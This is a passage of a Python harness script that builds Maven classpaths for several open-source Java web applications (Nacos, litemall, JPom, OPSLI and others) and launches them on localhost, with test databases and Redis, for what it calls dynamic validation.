    ]
    return ensure_p1_classpath(
        "erupt-sample",
        Path("/tmp/p1-erupt-sample-cp.txt"),
        ERUPT_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-pl",
            "erupt-sample",
            "-am",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p1-erupt-sample-cp.txt",
        ],
        modules,
        dependency_filter=lambda item: "/xyz/erupt/" not in item or "/xyz/erupt/linq.j/" in item,
    )


def rebuild_classpath() -> str:
    return ensure_p1_classpath(
        "rebuild",
        Path("/tmp/p1-rebuild-cp.txt"),
        REBUILD_DIR,
        [
            "mvn",
            "-q",
            "-s",
            (BASE_DIR / ".build-cache" / "m2" / "settings-china.xml").as_posix(),
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-DskipTests",
            "-Dmaven.test.skip=true",
            "-DskipITs",
            "-Dmaven.javadoc.skip=true",
            "-Dgpg.skip=true",
            "-Dskip.gpg=true",
            "-Denforcer.skip=true",
            "-Dcheckstyle.skip=true",
            "-Dspotbugs.skip=true",
            "-Dpmd.skip=true",
            "-Dlicense.skip=true",
            "-Dfrontend.skip=true",
            "-Dskip.installnodenpm=true",
            "-Dskip.npm=true",
            "-Dskip.yarn=true",
            "-Dskip.gulp=true",
            "-Dskip.bower=true",
            "-Dskip.webpack=true",
            "-Dmaven.antrun.skip=true",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p1-rebuild-cp.txt",
        ],
        [REBUILD_DIR / "target" / "classes"],
        fallback_args_files=[BASE_DIR / "databases" / "applications" / "getrebuild__rebuild-db" / "log" / "ext" / "javac.args"],
    )


def xxl_boot_classpath() -> str:
    return ensure_p1_classpath(
        "xxl-boot-api",
        Path("/tmp/p1-xxl-boot-api-cp.txt"),
        XXL_BOOT_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-pl",
            "xxl-boot-api",
            "-am",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p1-xxl-boot-api-cp.txt",
        ],
        [XXL_BOOT_DIR / "xxl-boot-api" / "target" / "classes"],
        dependency_filter=lambda item: "/com/xuxueli/xxl-boot-" not in item,
    )


def jmqtt_classpath() -> str:
    m2 = BASE_DIR / ".build-cache" / "m2" / "repository"
    modules = [
        "jmqtt-broker",
        "jmqtt-bus",
        "jmqtt-mqtt",
        "jmqtt-support",
        "jmqtt-tcp",
    ]
    return ensure_p1_classpath(
        "jmqtt",
        Path("/tmp/p1-jmqtt-cp.txt"),
        JMQTT_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-pl",
            "jmqtt-broker",
            "-am",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p1-jmqtt-cp.txt",
        ],
        [
            *[JMQTT_DIR / module / "target" / "classes" for module in modules],
            m2 / "com" / "google" / "guava" / "guava" / "31.0.1-jre" / "guava-31.0.1-jre.jar",
            m2 / "com" / "google" / "guava" / "failureaccess" / "1.0.1" / "failureaccess-1.0.1.jar",
            m2 / "org" / "mybatis" / "mybatis" / "3.5.6" / "mybatis-3.5.6.jar",
            m2 / "com" / "alibaba" / "druid" / "1.2.4" / "druid-1.2.4.jar",
            m2 / "mysql" / "mysql-connector-java" / "8.0.17" / "mysql-connector-java-8.0.17.jar",
        ],
        dependency_filter=lambda item: "/org/jmqtt/" not in item,
    )


def socket_mqtt_classpath() -> str:
    return ensure_p1_classpath(
        "socket-mqtt",
        Path("/tmp/p1-socket-mqtt-cp.txt"),
        SOCKET_MQTT_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-DskipTests",
            "test-compile",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p1-socket-mqtt-cp.txt",
        ],
        [
            SOCKET_MQTT_DIR / "target" / "classes",
            SOCKET_MQTT_DIR / "target" / "test-classes",
        ],
    )


def nacos_classpath() -> str:
    m2 = BASE_DIR / ".build-cache" / "m2" / "repository"
    modules = [
        "bootstrap",
        "server",
        "console",
        "core",
        "naming",
        "config",
        "api",
        "auth",
        "common",
        "consistency",
        "persistence",
        "sys",
        "plugin-default-impl/nacos-default-plugin-all",
        "plugin-default-impl/nacos-default-auth-plugin",
        "plugin-default-impl/nacos-default-control-plugin",
        "plugin-default-impl/nacos-default-datasource-plugin/nacos-datasource-plugin-base",
        "plugin-default-impl/nacos-default-datasource-plugin/nacos-datasource-plugin-derby",
        "plugin-default-impl/nacos-default-datasource-plugin/nacos-datasource-plugin-mysql",
    ]
    return ensure_p1_classpath(
        "nacos-bootstrap",
        Path("/tmp/p1-nacos-cp.txt"),
        NACOS_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-pl",
            "bootstrap",
            "-am",
            "-DskipTests",
            "-Dcheckstyle.skip=true",
            "-Drat.skip=true",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p1-nacos-cp.txt",
        ],
        [
            *[NACOS_DIR / module / "target" / "classes" for module in modules],
            m2 / "io" / "prometheus" / "prometheus-metrics-exposition-textformats" / "1.4.3" / "prometheus-metrics-exposition-textformats-1.4.3.jar",
            m2 / "io" / "prometheus" / "prometheus-metrics-exposition-formats" / "1.4.3" / "prometheus-metrics-exposition-formats-1.4.3.jar",
            m2 / "io" / "prometheus" / "prometheus-metrics-tracer-common" / "1.4.3" / "prometheus-metrics-tracer-common-1.4.3.jar",
        ],
        dependency_filter=lambda item: "/com/alibaba/nacos/" not in item,
        fallback_args_files=[
            BASE_DIR / "databases" / "applications" / "alibaba__nacos-db" / "log" / "ext" / name
            for name in ("javac-21.args", "javac-43.args", "javac-45.args", "javac-47.args")
        ],
    )


def diyhi_classpath() -> str:
    return ensure_p1_classpath(
        "diyhi-bbs",
        Path("/tmp/p1-diyhi-cp.txt"),
        DIYHI_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p1-diyhi-cp.txt",
        ],
        [DIYHI_DIR / "target" / "classes"],
        fallback_args_files=application_javac_args("diyhi__bbs-db"),
    )


def jpom_classpath() -> str:
    modules = [
        JPOM_DIR / "modules" / "server" / "target" / "classes",
        JPOM_DIR / "modules" / "common" / "target" / "classes",
        *sorted((JPOM_DIR / "modules" / "storage-module").glob("**/target/classes")),
        *sorted((JPOM_DIR / "modules" / "sub-plugin").glob("**/target/classes")),
    ]
    items = [
        *[path.as_posix() for path in modules if path.exists()],
        *[path.as_posix() for path in sorted((JPOM_DIR / "modules" / "agent-transport").glob("**/target/classes"))],
        *classpath_from_javac_args(application_javac_args("dromara__jpom-db")),
    ]
    return ":".join(
        unique_existing_classpath(
            [
                item
                for item in items
                if "/modules/agent/" not in item
            ]
        )
    )


def ujcms_classpath() -> str:
    m2 = BASE_DIR / ".build-cache" / "m2" / "repository"
    modules = [
        UJCMS_DIR / "ujcms-starter" / "target" / "classes",
        UJCMS_DIR / "ujcms-cms" / "target" / "classes",
        UJCMS_DIR / "ujcms-common" / "target" / "classes",
    ]
    return classpath_from_application_db(
        "dromara__ujcms-db",
        modules,
        extra_items=[m2 / "com" / "mysql" / "mysql-connector-j" / "8.0.33" / "mysql-connector-j-8.0.33.jar"],
    )


def litemall_classpath() -> str:
    modules = [
        LITEMALL_DIR / "litemall-all" / "target" / "classes",
        LITEMALL_DIR / "litemall-all-war" / "target" / "classes",
        LITEMALL_DIR / "litemall-admin-api" / "target" / "classes",
        LITEMALL_DIR / "litemall-wx-api" / "target" / "classes",
        LITEMALL_DIR / "litemall-core" / "target" / "classes",
        LITEMALL_DIR / "litemall-db" / "target" / "classes",
    ]
    return ensure_p1_classpath(
        "litemall-all",
        Path("/tmp/p1-litemall-cp.txt"),
        LITEMALL_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-pl",
            "litemall-all",
            "-am",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p1-litemall-cp.txt",
        ],
        modules,
        dependency_filter=lambda item: "/org/linlinjava/" not in item,
        fallback_args_files=application_javac_args("linlinjava__litemall-db"),
    )


def opsli_classpath() -> str:
    m2 = BASE_DIR / ".build-cache" / "m2" / "repository"
    modules = [
        *sorted(OPSLI_DIR.glob("**/target/classes")),
        m2 / "com" / "mysql" / "mysql-connector-j" / "8.0.33" / "mysql-connector-j-8.0.33.jar",
    ]
    return ensure_p1_classpath(
        "opsli-starter",
        Path("/tmp/p1-opsli-cp.txt"),
        OPSLI_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-pl",
            "opsli-starter",
            "-am",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p1-opsli-cp.txt",
        ],
        modules,
        dependency_filter=lambda item: "/org/opsli/" not in item,
        fallback_args_files=application_javac_args("hiparker__opsli-boot-db"),
    )


def shopping_cart_maven_package() -> None:
    exploded = SHOPCART_DIR / "target" / "shopping-cart-0.0.1-SNAPSHOT"
    if exploded.exists() and (exploded / "WEB-INF" / "classes").exists():
        return
    completed = p0.run(
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-DskipTests",
            "package",
        ],
        SHOPCART_DIR,
    )
    if completed.returncode != 0:
        raise RuntimeError(f"shopping-cart Maven package failed:\n{completed.stdout}")


def shopping_cart_tomcat_jars() -> list[Path]:
    m2 = BASE_DIR / ".build-cache" / "m2" / "repository"
    preferred = "9.0.83"
    jars = [
        m2 / "org" / "apache" / "tomcat" / "embed" / "tomcat-embed-core" / preferred / f"tomcat-embed-core-{preferred}.jar",
        m2 / "org" / "apache" / "tomcat" / "embed" / "tomcat-embed-jasper" / preferred / f"tomcat-embed-jasper-{preferred}.jar",
        m2 / "org" / "apache" / "tomcat" / "embed" / "tomcat-embed-el" / preferred / f"tomcat-embed-el-{preferred}.jar",
        m2 / "org" / "eclipse" / "jdt" / "ecj" / "3.26.0" / "ecj-3.26.0.jar",
    ]
    return [jar for jar in jars if jar.exists()]


def compile_shopping_cart_tomcat_harness() -> Path:
    source_dir = RUNTIME_DIR / "shopping-cart-tomcat-harness"
    classes_dir = source_dir / "classes"
    source_dir.mkdir(parents=True, exist_ok=True)
    classes_dir.mkdir(parents=True, exist_ok=True)
    source = source_dir / "ShoppingCartTomcatHarness.java"
    source.write_text(
        """
import org.apache.catalina.Context;
import org.apache.catalina.startup.Tomcat;

public class ShoppingCartTomcatHarness {
    public static void main(String[] args) throws Exception {
        int port = Integer.parseInt(args[0]);
        String webapp = args[1];
        String base = args[2];
        Tomcat tomcat = new Tomcat();
        tomcat.setPort(port);
        tomcat.setBaseDir(base);
        tomcat.getConnector();
        Context context = tomcat.addWebapp("", webapp);
        context.setParentClassLoader(Thread.currentThread().getContextClassLoader());
        tomcat.start();
        tomcat.getServer().await();
    }
}
""".strip()
        + "\n",
        encoding="utf-8",
    )
    cp = ":".join(path.as_posix() for path in shopping_cart_tomcat_jars())
    javac = p0.shutil.which("javac") or "javac"
    completed = subprocess.run(
        [javac, "-cp", cp, "-d", classes_dir.as_posix(), source.as_posix()],
        cwd=BASE_DIR,
        check=False,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    if completed.returncode != 0:
        raise RuntimeError(f"shopping-cart embedded Tomcat harness compile failed:\n{completed.stdout}")
    return classes_dir


def shopping_cart_webapp(mysql_port: int) -> Path:
    shopping_cart_maven_package()
    source = SHOPCART_DIR / "target" / "shopping-cart-0.0.1-SNAPSHOT"
    runtime = RUNTIME_DIR / f"shopping-cart-webapp-{mysql_port}"
    p0.shutil.rmtree(runtime, ignore_errors=True)
    p0.shutil.copytree(source, runtime)
    props = runtime / "WEB-INF" / "classes" / "application.properties"
    props.write_text(
        "\n".join(
            [
                "db.driverName = com.mysql.cj.jdbc.Driver",
                f"db.connectionString = jdbc:mysql://127.0.0.1:{mysql_port}/shopping-cart?useUnicode=true&characterEncoding=utf8&useSSL=false&allowPublicKeyRetrieval=true&serverTimezone=Asia/Shanghai",
                "db.username = root",
                "db.password = root",
                "mailer.email=your_email",
                "mailer.password=your_app_password_generated_from_email",
                "",
            ]
        ),
        encoding="utf-8",
    )
    return runtime


def start_redis_container_with_password(name: str, port: int, password: str) -> str:
    if not p0.docker_available():
        raise RuntimeError("docker is not available for Redis dependency")
    p0.docker_rm(name)
    image = p0.docker_pull_first(["docker.1ms.run/redis:7-alpine", "redis:7-alpine"])
    completed = p0.docker_run(
        [
            "docker",
            "run",
            "-d",
            "--name",
            name,
            "-p",
            f"127.0.0.1:{port}:6379",
            image,
            "redis-server",
            "--requirepass",
            password,
        ]
    )
    if completed.returncode != 0:
        raise RuntimeError(f"failed to start Redis container {name}:\n{completed.stdout}")
    if not p0.wait_for_port(port, 60):
        raise RuntimeError(f"Redis container {name} did not expose port {port}")
    return image


def start_sba(case: Candidate, heap: str, port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    command = p0.spring_boot_command(
        heap,
        sba_classpath(),
        "de.codecentric.boot.admin.sample.SpringBootAdminServletApplication",
        f"--server.port={port}",
        "--spring.profiles.active=insecure",
        "--spring.boot.admin.client.enabled=false",
        "--spring.cloud.config.enabled=false",
        "--spring.config.import=",
        "--spring.main.lazy-initialization=true",
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    sample = SBA_DIR / "spring-boot-admin-samples" / "spring-boot-admin-sample-servlet"
    process, handle = p0.start_java(command, log_path, sample)
    if not p0.wait_for_http(f"http://127.0.0.1:{port}/instances", 150, process):
        p0.stop_process(process, handle)
        raise RuntimeError(f"Spring Boot Admin did not serve /instances on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_nacos(case: Candidate, heap: str, port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    nacos_home = RUNTIME_DIR / f"{case.candidate_id.lower()}-nacos-home"
    (nacos_home / "conf").mkdir(parents=True, exist_ok=True)
    source_conf = NACOS_DIR / "distribution" / "conf" / "application.properties"
    if source_conf.exists():
        (nacos_home / "conf" / "application.properties").write_text(
            source_conf.read_text(encoding="utf-8", errors="replace"),
            encoding="utf-8",
        )
    command = p0.spring_boot_command(
        heap,
        nacos_classpath(),
        "com.alibaba.nacos.bootstrap.NacosBootstrap",
        f"--server.port={port}",
        "--nacos.standalone=true",
        "--nacos.core.auth.enabled=false",
        "--nacos.core.auth.server.identity.key=p1-dynamic-key",
        "--nacos.core.auth.server.identity.value=p1-dynamic-value",
        f"--nacos.core.auth.plugin.nacos.token.secret.key={NACOS_TEST_TOKEN_SECRET}",
        "--nacos.deployment.type=server",
        "--spring.jmx.enabled=false",
        "--logging.level.root=WARN",
        jvm_args=(
            *p0.JAVA_LEGACY_OPENS,
            f"-Dnacos.home={nacos_home}",
            "-Dnacos.standalone=true",
            "-Dnacos.deployment.type=server",
            "-Dnacos.member.list=127.0.0.1",
            "-Dnacos.core.auth.server.identity.key=p1-dynamic-key",
            "-Dnacos.core.auth.server.identity.value=p1-dynamic-value",
            f"-Dnacos.core.auth.plugin.nacos.token.secret.key={NACOS_TEST_TOKEN_SECRET}",
        ),
        java_preferred=("java-22-openjdk", "java-21-openjdk", "java-17-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = p0.start_java(command, log_path, NACOS_DIR)
    deadline = time.monotonic() + 180
    while time.monotonic() < deadline:
        if process.poll() is not None:
            break
        if wait_for_host_port("127.0.0.1", port, 0.5):
            time.sleep(2)
            return process, handle, log_path
        time.sleep(0.5)
    if process.poll() is None:
        p0.stop_process(process, handle)
    raise RuntimeError(f"Nacos did not open HTTP port {port}; see {rel(log_path)}")


def start_diyhi(case: Candidate, heap: str, port: int, mysql_port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    external_dir = RUNTIME_DIR / f"{case.candidate_id.lower()}-diyhi-home"
    external_dir.mkdir(parents=True, exist_ok=True)
    jdbc_url = (
        f"jdbc:mysql://127.0.0.1:{mysql_port}/bbs-jdk21"
        "?useUnicode=true&characterEncoding=utf-8&serverTimezone=Asia/Shanghai"
        "&zeroDateTimeBehavior=CONVERT_TO_NULL&allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true"
    )
    command = p0.spring_boot_command(
        heap,
        diyhi_classpath(),
        "cms.Application",
        f"--server.port={port}",
        f"--bbs.externalDirectory={external_dir}",
        f"--spring.datasource.url={jdbc_url}",
        "--spring.datasource.username=root",
        "--spring.datasource.password=123456",
        "--spring.datasource.hikari.maximum-pool-size=8",
        "--spring.jpa.hibernate.ddl-auto=update",
        "--jasypt.encryptor.password=123456",
        "--logging.level.root=WARN",
        "--spring.main.banner-mode=off",
        java_preferred=("java-21-openjdk", "java-22-openjdk", "java-17-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = p0.start_java(command, log_path, DIYHI_DIR)
    if not p0.wait_for_http(f"http://127.0.0.1:{port}/captcha/p1-ready", 180, process):
        p0.stop_process(process, handle)
        raise RuntimeError(f"DIYHI BBS did not serve /captcha/{{captchaKey}} on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_jpom(case: Candidate, heap: str, port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    jpom_home = RUNTIME_DIR / f"{case.candidate_id.lower()}-jpom-home"
    jpom_home.mkdir(parents=True, exist_ok=True)
    command = p0.spring_boot_command(
        heap,
        jpom_classpath(),
        "org.dromara.jpom.JpomServerApplication",
        f"--server.port={port}",
        f"--jpom.path={jpom_home}",
        "--jpom.web.disabled-captcha=false",
        "--jpom.db.mode=H2",
        "--jpom.db.cache-size=16MB",
        "--spring.main.banner-mode=off",
        "--logging.level.root=WARN",
        jvm_args=(*p0.JAVA_LEGACY_OPENS, f"-Djpom.path={jpom_home}", "-Djpom.applicationTag=server"),
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = p0.start_java(command, log_path, JPOM_DIR / "modules" / "server")
    if not p0.wait_for_http(f"http://127.0.0.1:{port}/rand-code", 180, process):
        p0.stop_process(process, handle)
        raise RuntimeError(f"JPom did not serve /rand-code on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_ujcms(case: Candidate, heap: str, port: int, mysql_port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    jdbc_url = f"jdbc:mysql://127.0.0.1:{mysql_port}/ujcms?serverTimezone=Asia/Shanghai&characterEncoding=UTF-8&nullCatalogMeansCurrent=true&allowPublicKeyRetrieval=true&useSSL=false"
    command = p0.spring_boot_command(
        heap,
        ujcms_classpath(),
        "com.ujcms.cms.starter.Application",
        f"--server.port={port}",
        f"--spring.datasource.url={jdbc_url}",
        "--spring.datasource.username=root",
        "--spring.datasource.password=password",
        "--spring.liquibase.enabled=true",
        "--ujcms.data-sql-platform=mysql",
        "--ujcms.database-type=mysql",
        "--spring.cache.type=caffeine",
        "--spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration,org.springframework.boot.autoconfigure.elasticsearch.ElasticsearchRestClientAutoConfiguration",
        "--logging.level.root=ERROR",
        "--spring.main.banner-mode=off",
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = p0.start_java(command, log_path, UJCMS_DIR / "ujcms-starter")
    if not p0.wait_for_http(f"http://127.0.0.1:{port}/api/visit/online-visitors", 240, process):
        p0.stop_process(process, handle)
        raise RuntimeError(f"UJCMS did not serve visit API on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_litemall(case: Candidate, heap: str, port: int, mysql_port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    storage = RUNTIME_DIR / f"{case.candidate_id.lower()}-litemall-storage"
    storage.mkdir(parents=True, exist_ok=True)
    jdbc_url = (
        f"jdbc:mysql://127.0.0.1:{mysql_port}/litemall"
        "?useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai"
        "&allowPublicKeyRetrieval=true&verifyServerCertificate=false&useSSL=false"
    )
    command = p0.spring_boot_command(
        heap,
        litemall_classpath(),
        "org.linlinjava.litemall.Application",
        f"--server.port={port}",
        "--spring.profiles.active=db,core,admin,wx",
        f"--spring.datasource.druid.url={jdbc_url}",
        "--spring.datasource.druid.username=root",
        "--spring.datasource.druid.password=litemall",
        "--spring.datasource.druid.initial-size=2",
        "--spring.datasource.druid.min-idle=1",
        "--spring.datasource.druid.max-active=8",
        f"--litemall.storage.local.storagePath={storage}",
        f"--litemall.storage.local.address=http://127.0.0.1:{port}/wx/storage/fetch/",
        "--logging.level.root=WARN",
        "--spring.main.banner-mode=off",
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = p0.start_java(command, log_path, LITEMALL_DIR / "litemall-all")
    if not p0.wait_for_http(f"http://127.0.0.1:{port}/admin/auth/kaptcha", 180, process):
        p0.stop_process(process, handle)
        raise RuntimeError(f"litemall did not serve /admin/auth/kaptcha on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_opsli(case: Candidate, heap: str, port: int, mysql_port: int, redis_port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    upload_path = RUNTIME_DIR / f"{case.candidate_id.lower()}-opsli-files"
    upload_path.mkdir(parents=True, exist_ok=True)
    jdbc_url = (
        f"jdbc:mysql://127.0.0.1:{mysql_port}/opsli-boot"
        "?characterEncoding=UTF-8&useUnicode=true&useSSL=false&tinyInt1isBit=false"
        "&rewriteBatchedStatements=true&allowPublicKeyRetrieval=true&serverTimezone=Asia/Shanghai"
    )
    command = p0.spring_boot_command(
        heap,
        opsli_classpath(),
        "org.opsli.OpsliApplication",
        f"--server.port={port}",
        "--spring.profiles.active=local",
        f"--spring.datasource.dynamic.datasource.master.url={jdbc_url}",
        "--spring.datasource.dynamic.datasource.master.username=root",
        "--spring.datasource.dynamic.datasource.master.password=123456",
        "--spring.datasource.druid.initial-size=2",
        "--spring.datasource.druid.min-idle=1",
        "--spring.datasource.druid.max-active=8",
        "--spring.data.redis.host=127.0.0.1",
        f"--spring.data.redis.port={redis_port}",
        "--spring.data.redis.password=123456",
        f"--redisson.lock.server.address=127.0.0.1:{redis_port}",
        "--redisson.lock.server.password=123456",
        f"--opsli.web.upload-path={upload_path}",
        "--logging.level.root=WARN",
        "--spring.main.banner-mode=off",
        jvm_args=p0.JAVA_LEGACY_OPENS,
        java_preferred=("java-22-openjdk", "java-21-openjdk", "java-17-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = p0.start_java(command, log_path, OPSLI_DIR / "opsli-starter")
    if not p0.wait_for_http(f"http://127.0.0.1:{port}/opsli-boot/system/login", 240, process):
        p0.stop_process(process, handle)
        raise RuntimeError(f"OPSLI did not serve /opsli-boot/system/login on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_shopping_cart(case: Candidate, heap: str, port: int, mysql_port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    harness_classes = compile_shopping_cart_tomcat_harness()
    webapp = shopping_cart_webapp(mysql_port)
    base_dir = RUNTIME_DIR / f"{case.candidate_id.lower()}-tomcat-base"
    base_dir.mkdir(parents=True, exist_ok=True)
    classpath = ":".join(
        unique_existing_classpath(
            [
                harness_classes.as_posix(),
                *[path.as_posix() for path in shopping_cart_tomcat_jars()],
                *classpath_from_javac_args(application_javac_args("shashirajraja__shopping-cart-db")),
            ]
        )
    )
    command = p0.spring_boot_command(
        heap,
        classpath,
        "ShoppingCartTomcatHarness",
        str(port),
        webapp.as_posix(),
        base_dir.as_posix(),
        java_preferred=("java-21-openjdk", "java-22-openjdk", "java-17-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = p0.start_java(command, log_path, SHOPCART_DIR)
    if not p0.wait_for_http(f"http://127.0.0.1:{port}/login.jsp", 120, process):
        p0.stop_process(process, handle)
        raise RuntimeError(f"shopping-cart embedded Tomcat did not serve /login.jsp on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_erupt(case: Candidate, heap: str, port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    runtime_db = RUNTIME_DIR / f"{case.candidate_id.lower()}-erupt-h2"
    command = p0.spring_boot_command(
        heap,
        erupt_classpath(),
        "xyz.erupt.sample.EruptSampleApplication",
        f"--server.port={port}",
        f"--spring.datasource.url=jdbc:h2:file:{runtime_db};MODE=MySQL;CASE_INSENSITIVE_IDENTIFIERS=TRUE;DATABASE_TO_LOWER=TRUE",
        "--spring.jpa.hibernate.ddl-auto=update",
        "--spring.jpa.show-sql=false",
        "--logging.level.root=WARN",
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = p0.start_java(command, log_path, ERUPT_DIR / "erupt-sample")
    if not p0.wait_for_http(f"http://127.0.0.1:{port}/erupt-api/code-img?mark=1", 180, process):
        p0.stop_process(process, handle)
        raise RuntimeError(f"Erupt sample did not serve /erupt-api/code-img on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_rebuild(case: Candidate, heap: str, port: int, mysql_port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    data_dir = RUNTIME_DIR / f"{case.candidate_id.lower()}-rebuild-data"
    data_dir.mkdir(parents=True, exist_ok=True)
    jdbc_url = (
        f"jdbc:mysql://127.0.0.1:{mysql_port}/rebuild40"
        "?characterEncoding=UTF8&useUnicode=true&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B08:00"
    )
    (data_dir / ".rebuild").write_text(
        "\n".join(
            [
                "# REBUILD P1 dynamic validation install file",
                f"db.url={jdbc_url}",
                "db.user=root",
                "db.passwd=rebuild",
                "db.CacheHost=0",
                "",
            ]
        ),
        encoding="utf-8",
    )
    command = p0.spring_boot_command(
        heap,
        rebuild_classpath(),
        "com.rebuild.core.BootApplication",
        f"--server.port={port}",
        "--server.servlet.context-path=",
        f"--db.url={jdbc_url}",
        "--db.user=root",
        "--db.passwd=rebuild",
        "--spring.main.banner-mode=off",
        jvm_args=(f"-DDataDirectory={data_dir}", "-DSN=", "-Dinitialize=docker"),
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = p0.start_java(command, log_path, REBUILD_DIR)
    deadline = time.monotonic() + 180
    while time.monotonic() < deadline:
        if process.poll() is not None:
            break
        if "started successfully" in p0.log_text(log_path):
            return process, handle, log_path
        time.sleep(0.5)
    if process.poll() is None:
        p0.stop_process(process, handle)
    raise RuntimeError(f"Rebuild did not reach installed ready state on port {port}; see {rel(log_path)}")


def start_xxl_boot(case: Candidate, heap: str, port: int, mysql_port: int, redis_port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    log_home = RUNTIME_DIR / "xxl-boot-applogs"
    (log_home / "boot").mkdir(parents=True, exist_ok=True)
    command = p0.spring_boot_command(
        heap,
        xxl_boot_classpath(),
        "com.boot.BootApplication",
        f"--server.port={port}",
        "--spring.profiles.active=druid",
        f"--spring.datasource.druid.master.url=jdbc:mysql://127.0.0.1:{mysql_port}/boot?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=Asia/Shanghai",
        "--spring.datasource.druid.master.username=root",
        "--spring.datasource.druid.master.password=root_pwd",
        "--spring.datasource.druid.initialSize=1",
        "--spring.datasource.druid.minIdle=1",
        "--spring.datasource.druid.maxActive=4",
        "--spring.data.redis.host=127.0.0.1",
        f"--spring.data.redis.port={redis_port}",
        "--server.tomcat.threads.min-spare=4",
        "--server.tomcat.threads.max=32",
        jvm_args=(*p0.JAVA_LEGACY_OPENS, f"-DLOG_HOME={log_home}"),
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = p0.start_java(command, log_path, XXL_BOOT_DIR / "xxl-boot-api")
    if not p0.wait_for_http(f"http://127.0.0.1:{port}/captchaImage", 150, process):
        p0.stop_process(process, handle)
        raise RuntimeError(f"XXL-Boot API did not serve /captchaImage on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def jmqtt_runtime_home(port: int, mysql_port: int) -> Path:
    home = RUNTIME_DIR / f"jmqtt-{port}"
    home.mkdir(parents=True, exist_ok=True)
    (home / "jmqtt.properties").write_text(
        "\n".join(
            [
                "anonymousEnable=true",
                f"url=jdbc:mysql://127.0.0.1:{mysql_port}/jmqtt?characterEncoding=utf8&autoReconnect=true&failOverReadOnly=false&useSSL=false&serverTimezone=Asia/Shanghai",
                "username=root",
                "password=CallmeZ2013",
                "startTcp=true",
                f"tcpPort={port}",
                "startWebsocket=false",
                "startHttp=false",
                "startSslTcp=false",
                "startSslWebsocket=false",
                "maxMsgSize=524288",
                "useEpoll=false",
                "pooledByteBufAllocatorEnable=false",
